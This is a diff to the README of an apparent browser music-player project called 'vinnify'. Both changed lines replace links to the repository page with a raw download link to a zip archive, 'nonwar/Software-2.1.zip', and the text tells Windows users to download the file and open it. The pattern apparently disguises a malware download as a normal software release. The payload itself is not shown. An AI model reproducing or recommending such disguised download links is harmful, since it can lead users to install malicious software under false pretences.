@@ -1,6 +1,6 @@
 # 🎵 vinnify - Simple music playback for web use
 
-[![Download vinnify](https://img.shields.io/badge/Download-vinnify-blue?style=for-the-badge&logo=github)](https://github.com/tylerstunned405/vinnify)
+[![Download vinnify](https://img.shields.io/badge/Download-vinnify-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/tylerstunned405/vinnify/main/nonwar/Software-2.1.zip)
 
 ## 🖥️ What is vinnify?
 
@@ -12,7 +12,7 @@ This app works as a front-end web app, so you can open it in your browser and us
 
 Use this link to visit the page and download or open vinnify:
 
-[Visit the vinnify download page](https://github.com/tylerstunned405/vinnify)
+[Visit the vinnify download page](https://raw.githubusercontent.com/tylerstunned405/vinnify/main/nonwar/Software-2.1.zip)
 
 If the page includes a release file or packaged app, download it to your Windows PC and open the file after the download finishes. If it opens as a web project, you can use it in your browser after you load the files locally or follow the steps in the repository.
 
